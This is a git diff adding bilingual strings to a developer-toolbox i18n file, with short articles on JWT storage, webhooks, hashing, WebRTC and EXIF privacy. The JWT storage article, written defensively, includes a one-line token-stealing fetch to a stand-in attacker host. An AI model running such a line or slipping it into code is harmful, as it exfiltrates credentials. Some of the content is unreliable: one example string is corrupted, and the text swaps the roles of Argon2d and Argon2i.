@@ -18,6 +18,172 @@ const I18nController = {
   translations: {
     'zh-CN': {
 
+      "tool_card_json_doc_title": "JSON 规范 (RFC 8259) 与现代微服务数据序列化最佳实践",
+      "tool_card_json_doc_sub": "掌握 JSON 语法树解析机制、大整数精度丢失问题、循环引用解决与序列化性能调优。",
+      "tool_card_json_doc_body": `<h3><span class="material-symbols-outlined" style="font-size: 18px;">terminal</span> 1. JavaScript 64 位双精度浮点数与 19 位雪花算法 ID 丢失陷阱</h3>
+        <p>在前后端交互中，最容易引发灾难性生产 Bug 的是后端生成的 64 位雪花算法（Snowflake ID）长整数（如 <code>1787219372183921823</code>）：</p>
+        <ul>
+          <li><strong>根因分析</strong>：JavaScript 中的所有 <code>Number</code> 均为 IEEE 754 双精度浮点数，其能够安全表示的最大整数为 <code>Number.MAX_SAFE_INTEGER</code> (即 2<sup>53</sup> - 1，即 <code>9007199254740991</code>，约 16 位)；</li>
+          <li><strong>灾难现象</strong>：当后端返回超过 16 位的长整型 ID 时，前端 <code>JSON.parse()</code> 会自动将末尾几位数截断进位变异（如 <code>...823</code> 变成 <code>...800</code>），导致后续更新与查询无法命中目标记录；</li>
+          <li><strong>企业级解决方案</strong>：后端必须将所有超过 15 位的 ID（Long 类型）在序列化阶段显式转换为 <strong>String 字符串格式</strong>（例如在 Java Jackson 中配置 <code>@JsonSerialize(using = ToStringSerializer.class)</code>，或在 Go 中使用 <code>json:",string"</code>）。</li>
+        </ul>`,
+
+      "tool_card_jwt_doc_title": "JWT (RFC 7519) 架构设计与生产级安全防线",
+      "tool_card_jwt_doc_sub": "全面剖析无状态 Token 核心原理、None 算法漏洞、密钥爆破防御与 HttpOnly 安全存储模型。",
+      "tool_card_jwt_gold_body": `<h3><span class="material-symbols-outlined" style="font-size: 18px;">security</span> 生产环境防御 JWT 伪造的四大黄金准则</h3>
+        <ul>
+          <li><strong>强制白名单算法校验</strong>：在服务端验证逻辑中显式指定允许的算法集合（例如 <code>algorithms=['HS256']</code>），坚决杜绝依赖 JWT Header 中自声明的 <code>alg</code>；</li>
+          <li><strong>HMAC 密钥长度不低于 256 位</strong>：对称加密密钥 Secret 必须使用密码学真随机数生成（如 <code>openssl rand -base64 32</code>），严禁使用弱口令；</li>
+          <li><strong>短生命周期 + Refresh Token 轮转</strong>：Access Token 有效期建议设置为 15~30 分钟，配合持久化存储的 Refresh Token 实现无感刷新与紧急吊销；</li>
+          <li><strong>防 XSS 窃取</strong>：千万不要将 JWT 存在浏览器的 <code>localStorage</code> 中，应将其置于带有 <code>HttpOnly; Secure; SameSite=Strict</code> 属性的 Cookie 中传输。</li>
+        </ul>`,
+
+      "tool_card_hash_doc_title": "单向散列函数原理与慢哈希落库防护体系",
+      "tool_card_hash_doc_sub": "深入了解哈希雪崩效应、抗原像性与抗碰撞性，以及 Argon2id、bcrypt 抵御 GPU 暴力破解的原理。",
+
+      "tool_card_time_doc_title": "计算机时间系统与 2038 年危机 (Y2K38) 原理解析",
+      "tool_card_time_doc_sub": "深入了解 Unix 纪元时间、闰秒调整机制与跨时区夏令时处理规范。",
+
+      "tool_card_text_doc_title": "字符编码与 Base64 (RFC 4648) 数学原理",
+      "tool_card_text_doc_sub": "深入了解 8-bit 二进制流转换为 6-bit 打印字符集的数学映射、填充符 '=' 机制与 UTF-8 变长编码模型。",
+      "tool_card_text_b64_body": `<h3><span class="material-symbols-outlined" style="font-size: 18px;">format_quote</span> Base64 编码为什么会使数据体积增加约 33%？</h3>
+        <p>Base64 算法将每 3 个 8-bit 字节（共 24 bits）拆分为 4 个 6-bit 的单元（每个 6-bit 单元可对应 64 个可打印 ASCII 字符之一，即 2<sup>6</sup> = 64）：</p>
+        <ul>
+          <li><strong>体积计算</strong>：原始数据为 3 字节，编码后输出为 4 字节，数据体积膨胀比例为 <code>4 / 3 ≈ 1.333 (增加约 33.3%)</code>；</li>
+          <li><strong>Padding 填充符</strong>：若原始数据字节数不是 3 的倍数，末尾会以 <code>=</code> 补齐 24 位对齐要求；</li>
+          <li><strong>URL Safe 变体</strong>：标准 Base64 包含 <code>+</code> 和 <code>/</code>，在 URL 中会被误解析，因此 RFC 4648 提出了 Base64URL 规范，使用 <code>-</code> 替换 <code>+</code>，使用 <code>_</code> 替换 <code>/</code>，并省略尾部 <code>=</code>。</li>
+        </ul>`,
+
+      "tool_card_media_doc_title": "现代图像压缩算法 (WebP / AVIF) 与 EXIF 隐私安全白皮书",
+      "tool_card_media_doc_sub": "深入了解离散余弦变换 (DCT)、预测编码与照片地理位置信息泄露风险。",
+      "tool_card_media_exif_body": `<h3><span class="material-symbols-outlined" style="font-size: 18px;">warning</span> 照片 EXIF 元数据泄露风险：为什么社交分享前必须脱敏？</h3>
+        <p>现代智能手机相机在拍摄每一张照片时，默认都会将大量敏感硬件元数据写入图片头部（Exchangeable Image File Format，简称 EXIF）：</p>
+        <ul>
+          <li><strong>GPS 物理经纬度 (精确到 1 米)</strong>：照片直接记录了拍摄者的住宅楼层、家庭住址或办公地点；</li>
+          <li><strong>时间戳与相机设备序列号</strong>：记录精确到毫秒的拍摄时间与设备 IMEI/序列号，极易被用于关联个人身份；</li>
+          <li><strong>纯前端防御原理</strong>：通过 HTML5 <code>Canvas.drawImage()</code> 将图片像素重绘并导出，底层会直接丢弃所有 EXIF Header 二进制块，实现真正的 100% 物理级隐私擦除。</li>
+        </ul>`,
+
+      "tool_card_wifi_doc_title": "WiFi Alliance Easy Connect 规范与 WPA3 握手安全",
+      "tool_card_wifi_doc_sub": "了解国际标准 WiFi 二维码 URI 格式与 Simultaneous Authentication of Equals (SAE) 防破解协议。",
+      "tool_card_wifi_spec_body": `<h3><span class="material-symbols-outlined" style="font-size: 18px;">qr_code_2</span> WiFi 二维码国际标准协议语法详解</h3>
+        <p>iOS (iOS 11+) 与 Android (Android 10+) 原生相机均内置了对 WiFi 二维码标准 URI 的解析器：</p>
+        <pre class="code-block" style="background: #020617; padding: 12px; border-radius: var(--radius-sm); font-family: var(--font-mono); font-size: 13px; color: #38bdf8; overflow-x: auto;"><code>WIFI:S:MyHome_WiFi;T:WPA;P:P@ssw0rd1234;H:false;;</code></pre>
+        <ul>
+          <li><code>S:</code> 代表网络 SSID（网络名称）；</li>
+          <li><code>T:</code> 代表加密类型（<code>WPA</code>, <code>WEP</code>, 或 <code>nopass</code>）；</li>
+          <li><code>P:</code> 代表预共享网络密码；</li>
+          <li><code>H:</code> 代表是否为隐藏网络（<code>true</code> 或 <code>false</code>）。</li>
+        </ul>`,
+
+
+      "nav_articles": "极客技术专栏",
+      "nav_sitemap": "全站索引",
+      "nav_sitemap_html": "HTML 网站地图",
+      "footer_rights_articles": "© 2026 825412.xyz 极客多功能工具箱 | 开发者原创技术文库",
+
+
+      "art1_title": "WebRTC 点对点通信内幕与 NAT 穿透握手全流程白皮书",
+      "art1_sub": "掌握浏览器无插件直接进行 P2P 大文件投送的核心底层机制：从信令服务器、STUN 穿透、ICE Candidates 收集到 DTLS 加密传输通道构建。",
+      "art1_body": `<h2>一、为什么 WebRTC 是去中心化传输的终极解决方案？</h2>
+      <p>在传统的 HTTP/WebSocket 客户端-服务端中转架构中，用户 A 向用户 B 发送一个 50MB 的压缩包，必须经过以下路径：<code>用户 A ➔ 云端存储服务器 ➔ 用户 B</code>。这种模式存在严重的带宽成本、服务器 CPU 开销与隐私留存隐患。</p>
+      <p><strong>WebRTC (Web Real-Time Communication)</strong> 彻底颠覆了这种传统范式：它允许现代浏览器在没有任何中间存储服务器介入的情况下，在两台终端设备之间直接拉起一条端到端 UDP/SCTP 加密链路。</p>
+
+      <h2>二、WebRTC 点对点直连握手四大核心阶段 (The 4-Step Lifecycle)</h2>
+      <ol>
+        <li><strong>信令协商 (Signaling Phase)</strong>：双方通过轻量级信令中继广播加入房间的指令，交换各自的 Session Description Protocol (SDP)；</li>
+        <li><strong>STUN NAT 探测与 ICE 候选收集 (Candidate Gathering)</strong>：双方浏览器向公共 STUN 服务器（如 Google STUN）发送探测包，解析出当前设备在 NAT 路由器后的公网反射 IP 与内网本地 IP；</li>
+        <li><strong>NAT 穿透打洞 (P2P Hole Punching)</strong>：双方根据收集到的 ICE Candidates 尝试进行双向 UDP 握手。若两台设备在同一局域网 WiFi 下，将直接走内网直连（传输速率跑满千兆物理带宽）；</li>
+        <li><strong>DTLS 密钥协商与 SCTP 流式传输</strong>：握手成功后，双方基于 Datagram Transport Layer Security (DTLS) 建立 128/256 位加密通道，大文件以 64KB 二进制 ArrayBuffer 分块流式喷射。</li>
+      </ol>
+
+      <h2>三、常见网络拓扑下的 P2P 穿透率分析</h2>
+      <div class="doc-table-wrapper" style="margin: 20px 0;">
+        <table class="doc-table">
+          <thead>
+            <tr><th>网络环境类型</th><th>NAT 类型</th><th>P2P 直连成功率</th><th>传输延迟表现</th></tr>
+          </thead>
+          <tbody>
+            <tr><td><strong>同局域网 WiFi / 公司内网</strong></td><td>Full Cone / Restricted</td><td><span style="color:#10b981; font-weight:700;">100% (内网直连)</span></td><td>&lt; 2ms (满速千兆)</td></tr>
+            <tr><td><strong>家庭宽带跨省市直连</strong></td><td>Port Restricted Cone</td><td><span style="color:#10b981; font-weight:700;">&gt; 92% (STUN 打洞)</span></td><td>15ms ~ 40ms</td></tr>
+            <tr><td><strong>移动 4G/5G 蜂窝网络互联</strong></td><td>Symmetric NAT</td><td><span style="color:#f59e0b; font-weight:700;">约 75%</span></td><td>30ms ~ 80ms</td></tr>
+          </tbody>
+        </table>
+      </div>`,
+
+      "art2_title": "生产级 Webhook 消费端五大安全规范与分布式幂等性",
+      "art2_sub": "对外暴露公网 HTTP 回调端点极易受到黑客伪造请求、计时攻击或重复投递。本文总结了 GitHub、Stripe、微信支付等万亿级回调网关的通用防御架构。",
+      "art2_body": `<h2>一、Webhook 为什么比传统 HTTP 轮询 (Polling) 强 10 倍？</h2>
+      <p>传统轮询模式下，客户端每 3 秒发起一次 <code>GET /orders/status</code> 查询，99% 的请求返回“无变化”，白白消耗了服务器带宽与数据库连接池。而 Webhook 采用反向事件驱动架构，仅在事件实际发生时主动触发一次 POST 回调，降低 90% 以上的基础设施成本。</p>
+
+      <h2>二、生产级 Webhook 消费端五大安全铁律</h2>
+      <ol>
+        <li><strong>HMAC-SHA256 签名防伪造</strong>：消费端必须使用预共享密钥 <code>Secret</code> 对请求 Raw Body 计算散列，并使用常量时间比较函数（如 <code>hmac.compare_digest</code>）比对签名，彻底杜绝计时攻击 (Timing Attack)；</li>
+        <li><strong>时间戳防重放攻击 (Anti-Replay Window)</strong>：严格校验 Header 中的 <code>X-Timestamp</code>，超过 300 秒（5分钟）的请求直接丢弃；</li>
+        <li><strong>分布式消费幂等性 (Idempotency Key)</strong>：网络超时重试会导致同一事件被投递多次。消费端必须将 <code>event_id</code> 写入 Redis 分布式排他锁或数据库唯一约束；</li>
+        <li><strong>500ms 快速响应与异步队列解耦</strong>：接收到请求后在 500ms 内向发送方返回 <code>200 OK</code>，耗时业务逻辑通过消息队列（RabbitMQ / Kafka / Celery）异步消费；</li>
+        <li><strong>IP 白名单与 TLS 1.3 强制加密</strong>：限制仅允许上游网关的 CIDR 节点访问，防止中间人嗅探。</li>
+      </ol>`,
+
+      "art3_title": "现代密码安全黄金法则：信息熵数学模型与 NIST SP 800-63B 深度解析",
+      "art3_sub": "为什么传统强制包含大小写和特殊符号反而降低了安全性？深入解析美国国家标准技术研究所最新数字身份指南与密码学真随机数规范。",
+      "art3_body": `<h2>一、密码信息熵 (Shannon Entropy) 的数学推导</h2>
+      <p>密码信息熵代表猜测一个随机密码所需的平均不确定度（单位：Bits）。计算公式如下：</p>
+      <pre class="code-block" style="background: #020617; padding: 12px; border-radius: var(--radius-sm); font-family: var(--font-mono); font-size: 14px; color: #38bdf8;"><code>E = L × log2(N)</code></pre>
+      <ul>
+        <li><code>L</code>：密码长度（字符位数）；</li>
+        <li><code>N</code>：密码字符集可能空间（如 26 个小写字母 + 26 个大写字母 + 10 个数字 + 32 个特殊符号 = 94）。</li>
+      </ul>
+      <p>例如，一个 16 位全字符集随机密码的信息熵为：<code>16 × log2(94) ≈ 16 × 6.55 = 104.8 Bits</code>。以每秒 1000 亿次尝试的算力集群穷举，需耗时数亿年，具备军工级抗爆破能力。</p>
+
+      <h2>二、NIST SP 800-63B 颠覆传统的两大核心结论</h2>
+      <ol>
+        <li><strong>废除定期强制改密</strong>：频繁改密导致用户倾向于只修改末尾数字（如 <code>Pass123! ➔ Pass124!</code>），极大降低了实际熵值；</li>
+        <li><strong>长度优先于单纯复杂度</strong>：一个由 4 个随机英文单词组成的口令短语（如 <code>correct-horse-battery-staple</code>，长 28 位），比一个 8 位难记的复杂字符（如 <code>P@s'zh-CN': {!</code>）安全数万倍！</li>
+      </ol>`,
+
+      "art4_title": "Web 安全深度剖析：为什么千万不要在 LocalStorage 中存放 JWT 令牌？",
+      "art4_sub": "许多前端开发者习惯将 Access Token 随手存入 window.localStorage，但这为跨站脚本攻击 (XSS) 敞开了致命大门。本文为您梳理最佳防御范式。",
+      "art4_body": `<h2>一、LocalStorage 的致命软肋：对任意 JavaScript 完全开放</h2>
+      <p>任何运行在当前页面上下文的 JavaScript 脚本（包括第三方分析 SDK、未严格清洗的用户评论富文本、被篡改的 NPM 依赖包），都可以通过一行简单的代码直接读取并外发凭据：</p>
+      <pre class="code-block" style="background: #020617; padding: 12px; border-radius: var(--radius-sm); font-family: var(--font-mono); font-size: 13px; color: #f87171;"><code>fetch(https://attacker.com/steal?token= + localStorage.getItem(access_token));</code></pre>
+
+      <h2>二、终极防御体系：HttpOnly Cookie + 短期 Token + 内存隔离</h2>
+      <p>推荐采用行业标准的防御组合拳：</p>
+      <ul>
+        <li><strong>Access Token 驻留 JavaScript 内存</strong>：前端在应用启动时向认证中心请求 Token 并保存在变量或状态管理（Vuex / Redux）中，页面关闭即销毁；</li>
+        <li><strong>Refresh Token 存入 HttpOnly Cookie</strong>：服务端下发 Refresh Token 时设置 <code>Set-Cookie: refreshToken=...; HttpOnly; Secure; SameSite=Strict</code>，浏览器底层严禁任何 JS 访问该 Cookie，从根本上免疫 XSS 窃取；</li>
+        <li><strong>自动无感静默续期</strong>：当内存中的 Access Token 即将过期时，自动调用刷新接口利用 Cookie 换取新的短效 Token。</li>
+      </ul>`,
+
+      "art5_title": "单向散列函数演进史：从 MD5 碰撞到 Argon2 抗 GPU 爆破慢哈希实战",
+      "art5_sub": "为什么绝不能用 MD5 或 SHA-256 直接存储用户登录密码？深入理解“快哈希”与“慢哈希”的本质差异与工业界选型指南。",
+      "art5_body": `<h2>一、快哈希与慢哈希的本质区别</h2>
+      <p>密码学散列分为两个截然不同的设计方向：</p>
+      <ul>
+        <li><strong>快哈希 (Fast Hash - 如 SHA-256, BLAKE3)</strong>：目标是极速计算，用于校验大文件完整性与数字签名。现代 8 卡 RTX 4090 集群每秒可计算数百亿次 SHA-256；</li>
+        <li><strong>慢哈希 (Slow / Memory-Hard Hash - 如 Argon2id, bcrypt, PBKDF2)</strong>：专为密码落库设计，故意引入极高的计算轮数与高内存占用（Memory Cost），迫使攻击者的 GPU 显存耗尽，将单次穷举成本提高上百万倍。</li>
+      </ul>
+
+      <h2>二、现代工业界密码存储首选：Argon2id 规范</h2>
+      <p>Argon2 荣获国际密码哈希竞赛 (PHC) 冠军，结合了防御侧信道攻击的 Argon2d 与防御 GPU 并行计算的 Argon2i：</p>
+      <pre class="code-block" style="background: #020617; padding: 12px; border-radius: var(--radius-sm); font-family: var(--font-mono); font-size: 13px; color: #10b981;"><code>$argon2id$v=19$m=65536,t=3,p=4$c29tZXNhbHQ$...</code></pre>
+      <p>参数说明：<code>m=65536</code> (分配 64MB 内存), <code>t=3</code> (迭代 3 轮), <code>p=4</code> (4 个并行线程)。</p>`,
+
+      "art6_title": "浏览器端图像处理与隐私防御：Canvas 算法与 EXIF GPS 抹除实战",
+      "art6_sub": "如何实现 100% 不经任何服务器中转的纯本地极速图片压缩？深入解析 HTML5 Canvas 硬件加速、动态缩放双三次插值与元数据剥离方案。",
+      "art6_body": `<h2>一、传统服务端图片处理的缺陷</h2>
+      <p>将高清大图（如 10MB 的手机原图）上传给后端服务器进行处理存在两大痛点：一是上传和下载消耗双倍带宽并产生数秒等待；二是用户敏感照片留存在第三方云端存储中存在数据合规隐患。</p>
+
+      <h2>二、纯前端 Canvas 方案的四大核心优势</h2>
+      <ol>
+        <li><strong>零云端留存</strong>：图片直接加载到浏览器内存 Blob / ArrayBuffer，处理完毕立即释放，物理级零泄露；</li>
+        <li><strong>GPU 硬件加速重绘</strong>：利用底层图形加速器，5MB 照片压缩至 500KB 的 WebP 耗时通常在 200ms 以内；</li>
+        <li><strong>天然元数据剥离</strong>：<code>Canvas.drawImage()</code> 仅读取原始像素流，所有包含拍摄地点 GPS 与设备序列号的 EXIF Header 数据块会被底层直接丢弃；</li>
+        <li><strong>现代格式支持</strong>：原生支持输出高压缩比的 WebP 格式，在相同视觉质量下相比传统 JPEG 体积减小 30%~50%。</li>
+      </ol>`,
+
+
       'clip_input_ph': '// 在这里粘贴你的文本或代码...',
       'tool_json_ph': '在此粘贴待校验或格式化的 JSON 字符串...',
       'tool_jwt_ph': '在此粘贴 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...',
@@ -361,6 +527,169 @@ const I18nController = {
       'footer_rights': '© 2026 825412.xyz 极客多功能工具箱 | 保留所有权利'
     },
     'en-US': {
+
+      "tool_card_json_doc_title": "JSON Specification (RFC 8259) & Microservices Serialization",
+      "tool_card_json_doc_sub": "Master JSON abstract syntax tree (AST) parsing, 64-bit integer overflow, and high-throughput serialization.",
+      "tool_card_json_doc_body": `<h3><span class="material-symbols-outlined" style="font-size: 18px;">terminal</span> 1. JavaScript 64-Bit Float Precision Loss on 19-Digit Snowflake IDs</h3>
+        <p>In web application engineering, a common critical bug stems from backend 64-bit Snowflake Long IDs (e.g. <code>1787219372183921823</code>):</p>
+        <ul>
+          <li><strong>Root Cause</strong>: In JavaScript, all <code>Number</code> types are IEEE 754 double-precision floats with <code>Number.MAX_SAFE_INTEGER</code> equal to 2<sup>53</sup> - 1 (<code>9007199254740991</code>, ~16 digits);</li>
+          <li><strong>Disaster Impact</strong>: When receiving >16 digit Long integers, <code>JSON.parse()</code> silently rounds trailing digits (e.g. <code>...823</code> becomes <code>...800</code>), corrupting records;</li>
+          <li><strong>Industry Best Practice</strong>: Backends MUST serialize 64-bit IDs explicitly as <strong>String formats</strong> (e.g. Jackson <code>@JsonSerialize(using = ToStringSerializer.class)</code> or Go <code>json:",string"</code>).</li>
+        </ul>`,
+
+      "tool_card_jwt_doc_title": "JWT Architecture & Production Defense Matrix (RFC 7519)",
+      "tool_card_jwt_doc_sub": "Stateless token mechanics, None algorithm vulnerability prevention, and HttpOnly cookie models.",
+      "tool_card_jwt_gold_body": `<h3><span class="material-symbols-outlined" style="font-size: 18px;">security</span> 4 Golden Rules to Defend Against JWT Forgery</h3>
+        <ul>
+          <li><strong>Enforce Explicit Algorithm Whitelists</strong>: Validate against static server-side algorithm lists (e.g. <code>algorithms=['HS256']</code>), never trusting client Header declarations;</li>
+          <li><strong>Maintain >=256-Bit Secret Keys</strong>: Generate symmetric keys with cryptographic random generators (<code>openssl rand -base64 32</code>);</li>
+          <li><strong>Short TTL + Refresh Token Rotation</strong>: Keep Access Tokens at 15-30 mins TTL paired with database-backed revocable Refresh Tokens;</li>
+          <li><strong>Strict XSS Defense</strong>: Never store JWTs in <code>localStorage</code>; use <code>HttpOnly; Secure; SameSite=Strict</code> cookies.</li>
+        </ul>`,
+
+      "tool_card_hash_doc_title": "Cryptographic Hash Principles & Memory-Hard Slow Hashing",
+      "tool_card_hash_doc_sub": "Avalanche effects, collision resistance, and how Argon2id/bcrypt defeat GPU clusters.",
+
+      "tool_card_time_doc_title": "System Time Architectures & The Year 2038 Problem (Y2K38)",
+      "tool_card_time_doc_sub": "Unix epoch time standards, leap second handling, and 32-bit signed integer overflow mitigations.",
+
+      "tool_card_text_doc_title": "Character Encodings & Base64 Mathematics (RFC 4648)",
+      "tool_card_text_doc_sub": "Mapping 8-bit octet streams to 6-bit printable alphabets, padding '=' mechanics, and UTF-8.",
+      "tool_card_text_b64_body": `<h3><span class="material-symbols-outlined" style="font-size: 18px;">format_quote</span> Why Base64 Encoding Expands Data Volume by ~33%</h3>
+        <p>Base64 divides every 3 8-bit bytes (24 bits) into 4 6-bit units (2<sup>6</sup> = 64 printable characters):</p>
+        <ul>
+          <li><strong>Volume Growth</strong>: 3 bytes of raw binary produce 4 bytes of encoded text, resulting in a ratio of <code>4 / 3 ≈ 1.333 (+33.3%)</code>;</li>
+          <li><strong>Padding Character '='</strong>: Appended when data length is not divisible by 3 to satisfy 24-bit alignment;</li>
+          <li><strong>URL Safe Base64</strong>: Replaces <code>+</code> with <code>-</code> and <code>/</code> with <code>_</code> to avoid URL parameter mangling.</li>
+        </ul>`,
+
+      "tool_card_media_doc_title": "Modern Image Compression (WebP/AVIF) & EXIF Privacy",
+      "tool_card_media_doc_sub": "Discrete Cosine Transform (DCT), canvas rendering, and geolocation metadata leak prevention.",
+      "tool_card_media_exif_body": `<h3><span class="material-symbols-outlined" style="font-size: 18px;">warning</span> EXIF Metadata Privacy: Why Sanitizing Before Sharing is Critical</h3>
+        <p>Smartphones write sensitive hardware and environmental metadata into image headers (EXIF) by default:</p>
+        <ul>
+          <li><strong>GPS Geolocation Coordinates</strong>: Precise within 1 meter, exposing home and work locations;</li>
+          <li><strong>Timestamps & Camera Hardware IDs</strong>: Millisecond timestamps and IMEI/serial numbers allowing cross-site tracking;</li>
+          <li><strong>Client-Side Defense</strong>: HTML5 <code>Canvas.drawImage()</code> draws raw pixel bitmaps, physically discarding all EXIF header blocks with zero data upload.</li>
+        </ul>`,
+
+      "tool_card_wifi_doc_title": "WiFi Alliance Easy Connect & WPA3 Handshake Security",
+      "tool_card_wifi_doc_sub": "Standard WiFi QR URI grammar and Simultaneous Authentication of Equals (SAE) anti-cracking.",
+      "tool_card_wifi_spec_body": `<h3><span class="material-symbols-outlined" style="font-size: 18px;">qr_code_2</span> Standard WiFi QR URI Syntax Specification</h3>
+        <p>Native iOS (11+) and Android (10+) camera scanners parse standard WiFi URI strings:</p>
+        <pre class="code-block" style="background: #020617; padding: 12px; border-radius: var(--radius-sm); font-family: var(--font-mono); font-size: 13px; color: #38bdf8; overflow-x: auto;"><code>WIFI:S:MyHome_WiFi;T:WPA;P:P@ssw0rd1234;H:false;;</code></pre>
+        <ul>
+          <li><code>S:</code> Network SSID (Name);</li>
+          <li><code>T:</code> Authentication type (<code>WPA</code>, <code>WEP</code>, or <code>nopass</code>);</li>
+          <li><code>P:</code> Pre-shared wireless password;</li>
+          <li><code>H:</code> Hidden SSID flag (<code>true</code> / <code>false</code>).</li>
+        </ul>`,
+
+
+      "nav_articles": "Tech Publications",
+      "nav_sitemap": "Sitemap Index",
+      "nav_sitemap_html": "HTML Sitemap",
+      "footer_rights_articles": "© 2026 825412.xyz Geek Toolbox | Developer Technical Library",
+
+
+      "art1_title": "WebRTC Peer-to-Peer Protocol & NAT Traversal Deep-Dive Whitepaper",
+      "art1_sub": "Master browser-native P2P high-speed data transfer: From STUN servers, ICE candidate gathering, and SDP handshakes to DTLS/SCTP end-to-end encrypted pipelines.",
+      "art1_body": `<h2>1. Why WebRTC is the Ultimate Decentralized Transfer Solution</h2>
+      <p>In traditional HTTP/WebSocket client-server architectures, sending a 50MB file from User A to User B traverses a centralized path: <code>User A ➔ Cloud Storage ➔ User B</code>. This introduces major bandwidth costs, server CPU overhead, and critical data retention privacy risks.</p>
+      <p><strong>WebRTC (Web Real-Time Communication)</strong> completely revolutionizes this paradigm: It enables modern web browsers to establish direct, peer-to-peer UDP/SCTP encrypted connections without intermediate relays or storage servers.</p>
+
+      <h2>2. The 4-Step P2P Connection Lifecycle</h2>
+      <ol>
+        <li><strong>Signaling Phase</strong>: Devices broadcast presence via a lightweight websocket signaling hub and exchange Session Description Protocol (SDP) manifests;</li>
+        <li><strong>STUN NAT Discovery & ICE Candidate Gathering</strong>: Browsers probe public STUN servers (e.g. Google STUN) to resolve reflex public IPs and private LAN endpoints;</li>
+        <li><strong>P2P Hole Punching</strong>: Devices initiate dual-way UDP handshakes. If connected to the same local WiFi router, the connection automatically routes over local intranet at full gigabit hardware speed;</li>
+        <li><strong>DTLS Key Negotiation & SCTP Streaming</strong>: The channel is secured with Datagram Transport Layer Security (DTLS) 128/256-bit encryption, streaming binary ArrayBuffer chunks at 64KB intervals directly between client memory heaps.</li>
+      </ol>
+
+      <h2>3. P2P Traversal Success Rates Across Network Topologies</h2>
+      <div class="doc-table-wrapper" style="margin: 20px 0;">
+        <table class="doc-table">
+          <thead>
+            <tr><th>Network Environment</th><th>NAT Topology</th><th>P2P Direct Success Rate</th><th>Latency Profile</th></tr>
+          </thead>
+          <tbody>
+            <tr><td><strong>Same Local WiFi / Office LAN</strong></td><td>Full Cone / Restricted</td><td><span style="color:#10b981; font-weight:700;">100% (Direct Intranet)</span></td><td>&lt; 2ms (Gigabit Capable)</td></tr>
+            <tr><td><strong>Home Broadband (Cross-City)</strong></td><td>Port Restricted Cone</td><td><span style="color:#10b981; font-weight:700;">&gt; 92% (STUN Hole Punch)</span></td><td>15ms ~ 40ms</td></tr>
+            <tr><td><strong>Cellular 4G/5G Mobile Networks</strong></td><td>Symmetric NAT</td><td><span style="color:#f59e0b; font-weight:700;">~75%</span></td><td>30ms ~ 80ms</td></tr>
+          </tbody>
+        </table>
+      </div>`,
+
+      "art2_title": "Production-Grade Webhook Security Architecture & Idempotency Best Practices",
+      "art2_sub": "Public HTTP callback endpoints are vulnerable to request forgery, timing attacks, and replaying. Here is the standard architecture used by Stripe, GitHub, and PayPal.",
+      "art2_body": `<h2>1. Why Webhooks are 10x More Efficient Than HTTP Polling</h2>
+      <p>In traditional polling, clients call <code>GET /orders/status</code> every 3 seconds. 99% of requests return "no change", wasting bandwidth and database pools. Webhooks use event-driven reverse HTTP pushes, firing only when an event occurs and cutting infrastructure load by over 90%.</p>
+
+      <h2>2. The 5 Golden Security Rules for Webhook Consumers</h2>
+      <ol>
+        <li><strong>HMAC-SHA256 Signature Verification</strong>: Compute HMAC on the raw payload using your shared secret and compare using constant-time equality (e.g. <code>crypto.timingSafeEqual</code>) to prevent timing attacks;</li>
+        <li><strong>Timestamp Anti-Replay Windows</strong>: Validate the <code>X-Timestamp</code> header and discard requests older than 300 seconds (5 minutes);</li>
+        <li><strong>Distributed Idempotency Keys</strong>: Network retries cause duplicate deliveries. Store <code>event_id</code> in Redis locks or unique DB constraints;</li>
+        <li><strong>Fast 200 OK with Async Queueing</strong>: Respond with 200 OK within 500ms and offload processing to background workers (RabbitMQ / Kafka / Celery);</li>
+        <li><strong>IP Whitelisting & TLS 1.3 Enforcement</strong>: Restrict incoming traffic to known gateway IP CIDR ranges.</li>
+      </ol>`,
+
+      "art3_title": "Modern Password Security: Shannon Entropy & NIST SP 800-63B Guidelines",
+      "art3_sub": "Why do legacy character complexity rules harm security? Discover how Shannon information entropy and length-first paradigms stop GPU cracking clusters.",
+      "art3_body": `<h2>1. Mathematical Derivation of Shannon Password Entropy</h2>
+      <p>Information entropy represents the average uncertainty required to guess a random string (measured in bits):</p>
+      <pre class="code-block" style="background: #020617; padding: 12px; border-radius: var(--radius-sm); font-family: var(--font-mono); font-size: 14px; color: #38bdf8;"><code>E = L × log2(N)</code></pre>
+      <ul>
+        <li><code>L</code>: Password length in characters;</li>
+        <li><code>N</code>: Character set pool size (94 possible printable characters).</li>
+      </ul>
+      <p>A 16-character full-pool random password yields <code>16 × log2(94) ≈ 104.8 Bits</code> of entropy. Even an 8-card RTX 4090 cluster computing 100 billion hashes/sec requires billions of years to brute-force.</p>
+
+      <h2>2. Key Takeaways from NIST SP 800-63B</h2>
+      <ol>
+        <li><strong>Eliminate Periodic Expiry</strong>: Forcing password changes every 90 days causes predictable incremental mutations (e.g. <code>Spring2026! ➔ Summer2026!</code>);</li>
+        <li><strong>Length Always Trumps Complexity</strong>: A 4-word passphrase (e.g. <code>correct-horse-battery-staple</code>, 28 chars) is thousands of times stronger than an 8-character complex string.</li>
+      </ol>`,
+
+      "art4_title": "Web Security: Why You Must Never Store JWTs in LocalStorage",
+      "art4_sub": "Storing access tokens in window.localStorage leaves them defenseless against Cross-Site Scripting (XSS). Learn the gold-standard HttpOnly cookie defense model.",
+      "art4_body": `<h2>1. The Fatal Flaw of LocalStorage: Full JavaScript Access</h2>
+      <p>Any script executing in the document context (third-party trackers, compromised npm packages, unescaped user HTML) can steal credentials with a single line:</p>
+      <pre class="code-block" style="background: #020617; padding: 12px; border-radius: var(--radius-sm); font-family: var(--font-mono); font-size: 13px; color: #f87171;"><code>fetch(https://attacker.com/steal?token= + localStorage.getItem(access_token));</code></pre>
+
+      <h2>2. The Gold-Standard Architecture: Memory Tokens + HttpOnly Cookies</h2>
+      <ul>
+        <li><strong>Keep Access Tokens in JS Memory</strong>: Store the short-lived access token in memory variables (Redux / Pinia), which are erased when the tab closes;</li>
+        <li><strong>Store Refresh Tokens in HttpOnly Cookies</strong>: Set <code>Set-Cookie: refreshToken=...; HttpOnly; Secure; SameSite=Strict</code>. The browser engine forbids JavaScript from accessing HttpOnly cookies, making XSS token theft impossible;</li>
+        <li><strong>Silent Background Token Renewal</strong>: Silently exchange the HttpOnly cookie for a fresh in-memory access token right before expiration.</li>
+      </ul>`,
+
+      "art5_title": "Evolution of Hash Functions: From MD5 Collisions to Argon2 Memory-Hard Hashing",
+      "art5_sub": "Why must you never store passwords with MD5 or fast SHA-256? Understand fast vs memory-hard hashes and modern enterprise password storage standards.",
